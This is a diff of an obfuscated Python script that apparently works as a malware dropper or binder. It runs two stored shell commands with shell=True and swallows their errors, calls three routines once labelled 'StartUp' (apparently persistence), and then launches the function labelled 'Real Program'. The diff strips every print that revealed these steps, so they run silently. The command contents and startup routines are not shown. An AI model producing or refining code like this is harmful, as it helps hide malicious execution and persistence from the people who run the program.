@@ -168,35 +168,29 @@ def vdsu281cjm():
 
 
 if __name__ == '__main__':
-    if deiuc == 'y':
+    if deiuc == 'Y':
         try:
-            print("1 Shell Command")
             xvcj5tr.run(moon, shell=True, capture_output=False)
         except Exception as e:
             pass
 
-    if yxuiue == 'y':
+    if yxuiue == 'Y':
         try:
-            print("2 Shell Command")
             xvcj5tr.run(world, shell=True, capture_output=False)
         except Exception as e:
             pass
 
-    if xwwwrew == 'y':
-        print("1 StartUp")
+    if xwwwrew == 'Y':
         esuih()
     else:
         pass
-    if dsfrsdjk == 'y':
-        print("2 StartUp")
+    if dsfrsdjk == 'Y':
         hzirge()
     else:
         pass
-    if dsvisdf == 'y':
-        print("3 StartUp")
+    if dsvisdf == 'Y':
         hzirge()
     else:
         pass
     
-    print("1 Real Program")
     vdsu281cjm()
